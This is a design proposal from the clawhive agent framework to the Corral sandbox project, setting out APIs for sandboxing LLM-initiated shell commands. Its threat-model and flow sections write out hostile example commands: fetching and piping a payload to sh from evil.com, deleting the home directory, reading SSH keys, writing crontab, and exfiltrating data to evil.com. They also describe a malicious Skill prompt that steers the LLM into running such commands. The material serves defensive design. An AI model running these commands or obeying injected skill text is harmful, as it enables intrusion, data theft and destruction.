# Corral Integration Improvement Proposal

> **From**: clawhive project (Rust-native multi-agent framework)
> **To**: Corral development team
> **Date**: 2025-02-20
> **Version**: Draft v1

---

## 1. Use Case

### 1.1 What is clawhive

clawhive is a Rust-native multi-Agent framework, currently using Telegram + CLI as main interaction channels. Core flow:

```
User message → Gateway → Orchestrator → LLM (Claude/GPT)
                                       ↓
                                   LLM decides to call tools
                                       ↓
                                   ToolRegistry.execute()
                                       ↓
                              execute_command / read_file / write_file / ...
```

When the Agent converses with users, it decides which tools to use and what operations to execute based on **Skills** (capability descriptions).

### 1.2 Skill Format

clawhive Skills are **Markdown files + optional attached scripts**, not standalone executables:

```
skills/
├── web_fetch/
│   └── SKILL.md          ← Capability description for LLM (prompt injection)
├── data_processor/
│   ├── SKILL.md           ← Capability description
│   └── scripts/
│       ├── process.sh     ← Attached script (LLM may call via execute_command)
│       └── transform.py   ← Attached script
└── smart_shopping/
    ├── SKILL.md
    └── run.sh             ← Attached script
```

**Key point**: The Skill itself is not "executed" — its Markdown content is injected into LLM's system prompt, and LLM decides how to act after reading it. However, the Skill directory **may contain executable scripts**, which LLM calls through the `execute_command` tool.

### 1.3 Where the Security Gap Is

Current clawhive `execute_command` implementation (`shell_tool.rs`):

```rust
// Current implementation — completely no sandbox
tokio::process::Command::new("sh")
    .arg("-c")
    .arg(&command)          // Arbitrary command passed by LLM
    .current_dir(&workspace)
    .output()
```

**Threat scenarios**:

1. **Malicious community Skill** — Skill's prompt guides LLM to execute `execute_command("curl evil.com/payload | sh")`
2. **Malicious scripts attached to Skill** — `scripts/process.sh` contains `rm -rf ~` or data exfiltration operations
3. **LLM misoperation** — LLM misunderstands and executes dangerous commands beyond Skill's intent
4. **Path escape** — `read_file("../../.ssh/id_rsa")` or `write_file("/etc/crontab", ...)`

**Current security mechanisms**:

| Mechanism | Scope | Limitation |
|-----------|-------|------------|
| `tool_policy.allow` | Controls which tool names Agent can call | Can only say "don't use execute_command", can't say "execute_command only allowed to run curl" |
| `workspace` directory | cwd for `execute_command` | Doesn't prevent command from accessing files outside workspace |
| timeout | Limits execution time | Doesn't prevent any specific operations |

**What's missing**: Fine-grained constraints on what `execute_command` executes **internally** — file access, network connections, process creation.

### 1.4 Why Choose Corral

We evaluated multiple solutions:

| Solution | Evaluation Result |
|----------|-------------------|
| **WASM (wasmtime/wasmer)** | Can't directly run bash/python scripts, needs to compile to WASI, not friendly for `sh -c curl` scenarios |
| **Containers (Docker/Podman)** | Starting container per tool call, latency unacceptable (seconds vs milliseconds) |
| **macOS sandbox-exec** | Single platform, and API already deprecated |
| **seccomp-bpf** | Linux only, complex configuration, no high-level abstraction |
| **Corral** | Designed specifically for Agent Skills, capability-based, consistent Rust tech stack, cross-platform |

Corral is the only solution that **solves the problem at the right abstraction layer**: it understands the "Skill" concept, provides declarative permissions, and isolation mechanism works on script interpreters.

---

## 2. Current Corral Architecture and Integration Gap Analysis

### 2.1 Current Corral Architecture (Our Understanding)

```
                 corral CLI
                     │
          ┌──────────┼──────────┐
          ▼          ▼          ▼
       run        inspect    approve
          │
          ├── Manifest::load(skill_path)     Read permission declaration from skill.yaml
          ├── PolicyEngine::new(manifest)     Build policy engine
          ├── platform::create_runtime()      Create platform-specific isolated runtime
          ├── broker::start_broker(policy)    Start JSON-RPC broker
          ├── runtime.execute(&broker)        Execute skill entry point in sandbox
          └── audit::log_execution()          Log audit trail
```

This architecture assumes: **A complete Skill script runs from start to finish inside sandbox**.

### 2.2 Integration Gap

Differences between clawhive's usage pattern and Corral's current assumptions:

| Dimension | Corral Current Assumption | clawhive Actual Need |
|-----------|--------------------------|---------------------|
| **Call granularity** | Entire Skill script from entry point to end | **Single command execution** initiated by LLM (each `execute_command` call) |
| **Call method** | CLI (`corral run --skill ./path`) | Rust library call (`ExecuteCommandTool` internally calls API directly) |
| **Permission source** | `skill.yaml` file | clawhive's `SKILL.md` frontmatter or agent config |
| **Lifecycle** | One-shot: create sandbox → execute → destroy | Session-based: during one Skill activation, LLM may initiate multiple sandbox executions |
| **Broker requirement** | Required (scripts communicate with Broker via sandbox-call) | Optional (clawhive's tool system already provides similar capability proxy) |
| **Permission construction** | Parsed from YAML file | Programmatically constructed from code (may combine multiple sources: skill + agent config + global policy) |

### 2.3 Specific Technical Gaps

**Gap 1: No Library Crate**

Corral currently only has two workspace members: `corral` (CLI binary) and `sdk/sandbox-call`. All sandbox core logic (policy engine, platform runtime, broker) is in the `corral` binary crate.

clawhive cannot `cargo` depend on a binary crate. Need to extract core logic into standalone library crate.

**Gap 2: `PolicyEngine` Only Accepts Complete `Manifest`**

```rust
// Current corral PolicyEngine
impl PolicyEngine {
    pub fn new(manifest: Manifest) -> Self { ... }
}
```

`Manifest` contains `name`, `version`, `author`, `entry`, `runtime` and other fields unrelated to permissions. Downstream integrators only care about the `Permissions` part, shouldn't need to fake a complete `Manifest`.

**Gap 3: `Runtime` Trait Binds Complete Execution Flow**

```rust
// Current corral Runtime trait
#[async_trait]
pub trait Runtime {
    async fn execute(&self, broker: &BrokerHandle) -> Result<ExecutionResult>;
}
```

This trait assumes "execute" means "run an entry point script". clawhive needs "execute an arbitrary command under sandbox constraints".

**Gap 4: Sandbox Created From Scratch Each Time**

`MacOSRuntime::new()` calls `create_dir_all(work_dir)` each time, `execute()` calls `remove_dir_all(work_dir)` when done. If LLM initiates 10 `execute_command` calls in one conversation, current architecture creates/destroys sandbox environment 10 times.

**Gap 5: Broker is Hard Dependency**

`runtime.execute(&broker)` signature requires `BrokerHandle`. But clawhive already has its own tool system (`ToolRegistry`), providing `web_fetch`, `memory_search`, `read_file` and other capabilities. For clawhive, Corral's Broker service proxy is **optional value-add**, shouldn't be prerequisite for sandbox execution.

---

## 3. Core Improvement Suggestions

### 3.1 Suggestion 1: Extract `corral-core` Library Crate

**Goal**: Make Corral's sandbox capabilities usable as library dependency by other Rust projects.

**Changes**:

```
corral/
├── Cargo.toml                    # workspace
├── corral/                       # CLI binary (unchanged, depends on corral-core)
│   ├── Cargo.toml
│   └── src/main.rs
├── corral-core/                  # ← NEW: core library
│   ├── Cargo.toml
│   └── src/
│       ├── lib.rs
│       ├── policy.rs             # PolicyEngine (moved from corral/)
│       ├── manifest.rs           # Manifest + Permissions types (moved from corral/)
│       ├── sandbox.rs            # ← NEW: sandbox execution API
│       ├── platform/
│       │   ├── mod.rs
│       │   ├── macos.rs          # Moved from corral/
│       │   └── linux.rs          # Moved from corral/
│       ├── broker/               # Moved from corral/ (optional feature)
│       └── audit.rs              # Moved from corral/
├── libsandbox/                   # Unchanged
└── sdk/sandbox-call/             # Unchanged
```

`corral` CLI becomes thin wrapper around `corral-core`:

```rust
// corral/src/main.rs (after change)
use corral_core::{Manifest, PolicyEngine, SandboxBuilder};
// CLI logic calls corral_core public APIs
```

**Cargo.toml example**:

```toml
# corral-core/Cargo.toml
[package]
name = "corral-core"
version = "0.2.0"

[features]
default = ["sandbox-macos", "sandbox-linux"]
sandbox-macos = []
sandbox-linux = []
broker = ["tokio/net"]   # Broker as optional feature

[dependencies]
# ... core dependencies
```

### 3.2 Suggestion 2: Provide `SandboxBuilder` API — Programmatic Sandbox Construction

**Goal**: Let integrators build sandbox policies with code rather than YAML files, support flexible composition.

**Design**:

```rust
/// Sandbox builder — corral-core's core API
pub struct SandboxBuilder {
    permissions: Permissions,
    work_dir: Option<PathBuf>,
    data_dir: Option<PathBuf>,
    timeout: Option<Duration>,
    memory_limit: Option<usize>,
    broker_config: Option<BrokerConfig>,
    audit_config: Option<AuditConfig>,
}

impl SandboxBuilder {
    /// Build from scratch (default deny)
    pub fn new() -> Self;

    /// Build from existing Permissions
    pub fn from_permissions(perms: Permissions) -> Self;

    /// Build from skill.yaml / SKILL.md permission declarations
    pub fn from_manifest(manifest: &Manifest) -> Self;

    // --- Permission configuration (Builder pattern) ---

    /// Allow reading specified paths (glob pattern)
    pub fn allow_fs_read(mut self, patterns: &[&str]) -> Self;

    /// Allow writing specified paths (glob pattern)
    pub fn allow_fs_write(mut self, patterns: &[&str]) -> Self;

    /// Allow accessing specified network addresses
    pub fn allow_network(mut self, hosts: &[&str]) -> Self;

    /// Allow executing specified commands
    pub fn allow_exec(mut self, commands: &[&str]) -> Self;

    /// Allow accessing specified environment variables
    pub fn allow_env(mut self, vars: &[&str]) -> Self;

    /// Merge another set of permissions (for layering skill + agent + global policies)
    pub fn merge_permissions(mut self, additional: &Permissions) -> Self;

    // --- Resource limits ---

    pub fn timeout(mut self, duration: Duration) -> Self;
    pub fn memory_limit(mut self, bytes: usize) -> Self;
    pub fn work_dir(mut self, path: PathBuf) -> Self;

    // --- Optional components ---

    /// Enable Broker (system service proxy)
    pub fn with_broker(mut self, config: BrokerConfig) -> Self;

    /// Enable audit logging
    pub fn with_audit(mut self, config: AuditConfig) -> Self;

    // --- Build ---

    /// Build sandbox instance
    pub fn build(self) -> Result<Sandbox>;
}
```

**Usage example (clawhive integration)**:

```rust
// Inside clawhive's ExecuteCommandTool
let sandbox = SandboxBuilder::new()
    .allow_fs_read(&["$SKILL_DIR/**"])
    .allow_fs_write(&["$WORK_DIR/**"])
    .allow_network(&["api.example.com:443"])
    .allow_exec(&["curl", "jq", "python3"])
    .allow_env(&["LANG", "TZ"])
    .timeout(Duration::from_secs(30))
    .build()?;

let result = sandbox.execute("curl -s https://api.example.com/data | jq .").await?;
```

### 3.3 Suggestion 3: `Sandbox` Instance Supports Reuse (Session-based Sandbox)

**Goal**: During one Skill activation, multiple `execute_command` calls reuse same sandbox context.

**Design**:

```rust
/// Sandbox instance — reusable
pub struct Sandbox {
    policy: PolicyEngine,
    platform: Box<dyn PlatformSandbox>,
    work_dir: PathBuf,
    broker: Option<BrokerHandle>,
    audit: Option<AuditLogger>,
}

impl Sandbox {
    /// Execute single command (core API)
    pub async fn execute(&self, command: &str) -> Result<ExecutionResult>;

    /// Execute specified script file
    pub async fn execute_script(&self, script_path: &Path) -> Result<ExecutionResult>;

    /// Execute complete skill entry point (compatible with current corral CLI usage)
    pub async fn run_skill_entry(&self, entry: &str, runtime: &str) -> Result<ExecutionResult>;

    /// Get audit statistics
    pub fn stats(&self) -> SandboxStats;
}

impl Drop for Sandbox {
    fn drop(&mut self) {
        // Clean up work_dir, close broker socket, flush audit log
    }
}
```

**Lifecycle comparison**:

```
Current Corral (one-shot):
  create_runtime() → execute() → cleanup()  ← Full flow each time

Suggested session-based:
  Sandbox::build()                           ← Create once
    ├── sandbox.execute("curl ...")           ← Reuse
    ├── sandbox.execute("jq ...")             ← Reuse
    ├── sandbox.execute("python3 process.py") ← Reuse
    └── drop                                 ← Clean up once
```

### 3.4 Suggestion 4: Decouple `PolicyEngine` from `Manifest`

**Goal**: `PolicyEngine` should only care about `Permissions`, not depend on complete `Manifest`.

**Changes**:

```rust
// Current
impl PolicyEngine {
    pub fn new(manifest: Manifest) -> Self {
        Self { manifest: Arc::new(manifest) }
    }
}

// Suggested
impl PolicyEngine {
    /// Build directly from Permissions
    pub fn new(permissions: Permissions) -> Self {
        Self { permissions: Arc::new(permissions) }
    }

    /// Build from Manifest (convenience method)
    pub fn from_manifest(manifest: &Manifest) -> Self {
        Self::new(manifest.permissions.clone())
    }
}
```

Also, `Permissions` type should support merging:

```rust
impl Permissions {
    /// Merge two permission sets (union — more permissions)
    pub fn merge(&self, other: &Permissions) -> Permissions;

    /// Intersect (fewer permissions — for global policy restrictions)
    pub fn intersect(&self, other: &Permissions) -> Permissions;

    /// Parse from YAML string
    pub fn from_yaml(yaml: &str) -> Result<Self>;

    /// Check if empty (default deny state)
    pub fn is_empty(&self) -> bool;
}
```

**Why merging is needed**: clawhive permissions may come from multiple layers:

```
Final permission = skill declaration ∩ agent policy ∩ global policy

skill declaration:  network: [api.example.com:443, cdn.example.com:443]
agent policy:       network: [*.example.com:443]          ← agent level restriction
global policy:      network: [*:443]                       ← global only allows HTTPS
─────────────────────────────────────────────────────
Final:              network: [api.example.com:443, cdn.example.com:443]
```

### 3.5 Suggestion 5: Refactor `PlatformSandbox` Trait — Separate "Sandbox Environment" and "Execution"

**Goal**: Separate "creating sandbox environment" and "executing command in sandbox".

**Current design problem**:

```rust
// Current Runtime trait — creation and execution bound together
pub trait Runtime {
    async fn execute(&self, broker: &BrokerHandle) -> Result<ExecutionResult>;
}

// MacOSRuntime::new() creates work_dir during construction
// MacOSRuntime::execute() deletes work_dir after execution
```

**Suggested refactoring**:

```rust
/// Platform sandbox capability abstraction
#[async_trait]
pub trait PlatformSandbox: Send + Sync {
    /// Prepare sandbox environment (create directories, prepare libsandbox, etc.)
    async fn setup(&mut self, config: &SandboxConfig) -> Result<()>;

    /// Execute command in sandbox
    async fn execute_command(
        &self,
        command: &str,
        working_dir: &Path,
        env: &HashMap<String, String>,
    ) -> Result<ExecutionResult>;

    /// Execute script in sandbox
    async fn execute_script(
        &self,
        script: &Path,
        runtime: &str,   // "bash" | "python3" | "node"
        working_dir: &Path,
        env: &HashMap<String, String>,
    ) -> Result<ExecutionResult>;

    /// Clean up sandbox environment
    async fn teardown(&mut self) -> Result<()>;

    /// Platform name (for logging/audit)
    fn platform_name(&self) -> &str;
}
```

### 3.6 Suggestion 6: Broker as Optional Component

**Goal**: Sandbox execution shouldn't hard-depend on Broker. Broker should be optional enhancement.

**Reasons**:

1. clawhive already has its own `ToolRegistry`, providing file read/write, network requests, memory search and other capabilities. These capabilities are triggered by LLM via tool calls, don't need scripts to request via `sandbox-call`.

2. However, if Skill's script needs to call system services (calendar, reminders, notifications), Broker has value — it provides capabilities clawhive doesn't currently have.

**Suggested modularization**:

```toml
# corral-core/Cargo.toml
[features]
default = ["platform-macos", "platform-linux"]
platform-macos = []
platform-linux = []
broker = ["tokio/net"]           # Optional: enable Broker
services-reminders = ["broker"]  # Optional: reminders adapter
services-calendar = ["broker"]   # Optional: calendar adapter
services-browser = ["broker"]    # Optional: browser adapter
audit = []                       # Optional: audit logging
full = ["broker", "services-reminders", "services-calendar", "services-browser", "audit"]
```

```rust
// Usage without Broker
let sandbox = SandboxBuilder::new()
    .allow_exec(&["curl"])
    .allow_network(&["api.example.com:443"])
    .build()?;    // Only sandbox isolation, no Broker

// Usage with Broker
let sandbox = SandboxBuilder::new()
    .allow_exec(&["curl"])
    .with_broker(BrokerConfig {
        services: vec![ServiceConfig::Reminders { ... }],
    })
    .build()?;    // Sandbox isolation + Broker system service proxy
```

### 3.7 Suggestion 7: Improve libsandbox Policy Injection Method

**Current implementation**:

```rust
// macos.rs — Pass JSON policy via environment variable
cmd.env("SANDBOX_POLICY", policy_json);
```

```c
// interpose_macos.c — Load policy from environment variable
// policy_init() reads SANDBOX_POLICY environment variable
```

**Problems**: Environment variables have length limits (~256KB on macOS, ~128KB on Linux), complex policies may exceed. Also, environment variables are visible to child processes, leak risk.

**Suggestions**:

1. **Primary path**: Pass via file descriptor (`/proc/self/fd/N` or macOS pipe)
2. **Fallback path**: Write to temp file, pass file path via env var (`SANDBOX_POLICY_FILE=/tmp/corral-policy-xxx.json`), delete immediately after execution
3. **Keep**: Current env var method as fallback, since it's simple and works for short policies

```c
// Suggested policy.c change
void policy_init(void) {
    // Prefer reading from file descriptor
    const char *fd_str = getenv("SANDBOX_POLICY_FD");
    if (fd_str) {
        int fd = atoi(fd_str);
        // Read JSON policy from fd
        policy_load_from_fd(fd);
        return;
    }

    // Second, read from file
    const char *file = getenv("SANDBOX_POLICY_FILE");
    if (file) {
        policy_load_from_file(file);
        return;
    }

    // Fallback to environment variable
    const char *json = getenv("SANDBOX_POLICY");
    if (json) {
        policy_load_from_json(json);
        return;
    }

    // No policy = deny all
    policy_deny_all();
}
```

---

## 4. Integration Example (clawhive Perspective)

Demonstrating how clawhive uses improved Corral:

### 4.1 Skill Permission Declaration

SKILL.md frontmatter extension (compatible with existing format):

```yaml
# skills/web_fetch/SKILL.md
---
name: web_fetch
description: Fetch web content via curl
requires:
  bins: [curl]
  env: []
permissions:                      # ← NEW, consumed by Corral
  fs:
    read: [$SKILL_DIR/**]
    write: [$WORK_DIR/**]
  network:
    allow: ["*:443", "*:80"]
  exec: [curl, jq]
  env: [LANG, TZ]
---

# Web Fetch - URL Content Retrieval
...
```

### 4.2 clawhive Internal Integration

```rust
// clawhive-core/src/shell_tool.rs (after modification)

use corral_core::{Sandbox, SandboxBuilder, Permissions};

pub struct ExecuteCommandTool {
    workspace: PathBuf,
    default_timeout: u64,
    sandbox: Option<Sandbox>,   // ← NEW: currently active sandbox
}

impl ExecuteCommandTool {
    /// When Skill activates, create sandbox based on its permissions
    pub fn activate_skill_sandbox(&mut self, skill_permissions: &Permissions) -> Result<()> {
        let sandbox = SandboxBuilder::from_permissions(skill_permissions.clone())
            .work_dir(self.workspace.clone())
            .timeout(Duration::from_secs(self.default_timeout))
            .build()?;
        self.sandbox = Some(sandbox);
        Ok(())
    }

    /// Destroy sandbox when Skill deactivates
    pub fn deactivate_sandbox(&mut self) {
        self.sandbox = None;  // Drop triggers cleanup
    }
}

#[async_trait]
impl ToolExecutor for ExecuteCommandTool {
    async fn execute(&self, input: serde_json::Value) -> Result<ToolOutput> {
        let command = input["command"].as_str()
            .ok_or_else(|| anyhow!("missing 'command' field"))?;

        let result = if let Some(sandbox) = &self.sandbox {
            // Has sandbox: controlled execution
            sandbox.execute(command).await?
        } else {
            // No sandbox: direct execution (compatible with old skills without permissions)
            self.execute_raw(command).await?
        };

        Ok(ToolOutput {
            content: result.stdout,
            is_error: result.exit_code != 0,
        })
    }
}
```

### 4.3 End-to-End Flow

```
1. User message arrives → Orchestrator selects Agent + Skill

2. Skill loading:
   SkillRegistry::get("web_fetch")
   → Parse SKILL.md frontmatter
   → Get Permissions { fs, network, exec, ... }

3. Sandbox activation:
   execute_command_tool.activate_skill_sandbox(&skill.permissions)
   → SandboxBuilder::from_permissions(...)
   → Create Sandbox instance (set up libsandbox, work_dir, etc.)

4. LLM decision execution:
   LLM reads skill prompt → decides to call execute_command("curl -s https://api.example.com/data")
   → ExecuteCommandTool::execute()
   → sandbox.execute("curl -s https://api.example.com/data")
   → libsandbox checks: curl in exec whitelist? ✓ api.example.com:443 in network whitelist? ✓
   → Execution succeeds, returns result

5. LLM continues deciding:
   LLM → execute_command("curl http://evil.com/steal?data=...")
   → sandbox.execute(...)
   → libsandbox checks: evil.com not in network whitelist → EACCES
   → Returns error

6. Conversation ends → Skill deactivates → sandbox Drop → cleanup
```

---

## 5. Priority and Evolution Roadmap

### Phase 1: Library Crate Extraction (Suggestions 1, 4)

**Highest priority**. Without this step, downstream integration impossible.

- Extract `corral-core` crate
- Decouple `PolicyEngine` from `Manifest` to `Permissions`
- `Permissions` type supports programmatic construction and merging
- `corral` CLI changes to depend on `corral-core`
- No need to change libsandbox or platform implementation

**Estimated effort**: Medium (mainly file moves + interface adjustments, logic unchanged)

### Phase 2: SandboxBuilder + Session-based Sandbox (Suggestions 2, 3, 5)

**Core API layer**. This is the most-used interface for downstream.

- Implement `SandboxBuilder` API
- Implement `Sandbox`'s `execute()` / `execute_script()` methods
- Refactor `PlatformSandbox` trait to separate setup/execute/teardown
- Support `Sandbox` instance reuse

**Estimated effort**: Larger (involves runtime layer refactoring)

### Phase 3: Broker Optional + Feature Gate (Suggestion 6)

- Wrap Broker-related code with feature gates
- Without Broker, sandbox still works normally (only libsandbox level isolation)
- With Broker, provides system service proxy capabilities

**Estimated effort**: Medium

### Phase 4: Policy Injection Improvement + Enhancements (Suggestion 7)

- libsandbox policy injection supports file descriptor/temp file
- More complete glob path matching (current `$SKILL_DIR` etc. variable handling is preliminary)
- Structured audit log output

**Estimated effort**: Small to medium

### Phase 5: Stabilization

- Improve test coverage (especially libsandbox C code)
- CI/CD configuration (macOS + Linux dual platform)
- crates.io publishing
- Documentation completion

---

## 6. Open Questions

The following questions need Corral team evaluation:

1. **What should be the minimum API surface for Library Crate?** Is the `SandboxBuilder` + `Sandbox` design above reasonable, or is there a better abstraction?

2. **libsandbox distribution method**: When downstream depends on `corral-core`, how should `libsandbox.dylib` / `libsandbox.so` be built and distributed? build.rs auto-compile? Or require system pre-installation?

3. **Permission variable (`$SKILL_DIR` etc.) resolution timing**: Current `PolicyEngine` needs to know actual value of `$SKILL_DIR` when matching paths. Should this resolution happen at `SandboxBuilder::build()` time (pass in actual paths), or inside `PolicyEngine`?

4. **Sandbox coverage for non-shell tools like `read_file` / `write_file`**: clawhive doesn't only have `execute_command`, also has `read_file`, `write_file` and other tools implemented directly in Rust code. These operations don't go through `sh -c`, libsandbox can't intercept them. Should we provide path checking API at Rust layer (reuse `PolicyEngine::check_file_read/write`)?

5. **Sandbox isolation for concurrent multi-Skill**: If one Agent simultaneously activates multiple Skills (each with different permissions), how to manage sandbox instances? One independent `Sandbox` instance per Skill, or merge permissions?

---

## Appendix A: clawhive Current Architecture Reference

```
crates/
├── clawhive-core/
│   ├── src/
│   │   ├── tool.rs              ← ToolExecutor trait + ToolRegistry
│   │   ├── shell_tool.rs        ← execute_command implementation (core location needing sandbox wrapping)
│   │   ├── file_tools.rs        ← read_file / write_file / edit_file
│   │   ├── skill.rs             ← SkillFrontmatter + SkillRegistry
│   │   ├── orchestrator.rs      ← tool_use_loop (LLM ↔ Tool loop)
│   │   └── config.rs            ← ToolPolicyConfig (currently only tool name whitelist)
├── clawhive-runtime/
│   └── src/lib.rs               ← TaskExecutor trait (NativeExecutor / WasmExecutor stub)
```

**Tech stack overlap**: clawhive and Corral share tokio, serde, serde_yaml, anyhow, thiserror, clap, tracing — integration won't introduce new heavy dependencies.

## Appendix B: Corral Current Source Structure Reference

```
corral/
├── corral/src/
│   ├── main.rs          ← CLI entry + run_skill/inspect_skill/approve_skill
│   ├── manifest.rs      ← Manifest + Permissions type definitions + YAML parsing
│   ├── policy.rs        ← PolicyEngine (permission checking logic)
│   ├── broker/
│   │   ├── mod.rs       ← BrokerHandle + start_broker + broker_loop
│   │   ├── jsonrpc.rs   ← JSON-RPC request/response types
│   │   ├── router.rs    ← method → handler routing
│   │   └── handlers/    ← fs/network/services/exec/env handlers
│   ├── platform/
│   │   ├── mod.rs       ← Runtime trait + create_runtime()
│   │   ├── macos.rs     ← MacOSRuntime (DYLD + libsandbox)
│   │   └── linux.rs     ← LinuxRuntime (bubblewrap)
│   ├── watchdog.rs      ← Resource monitoring (currently TODO)
│   ├── audit.rs         ← Audit logging
│   └── adapters/        ← System service implementations (reminders etc.)
├── libsandbox/
│   ├── interpose_macos.c  ← DYLD interpose implementation (~350 lines)
│   ├── interpose_linux.c  ← LD_PRELOAD implementation
│   ├── policy.c           ← Policy loading and checking logic
│   └── comm.c             ← Broker communication
└── sdk/sandbox-call/src/
    └── main.rs            ← sandbox-call CLI (script-side SDK)
```
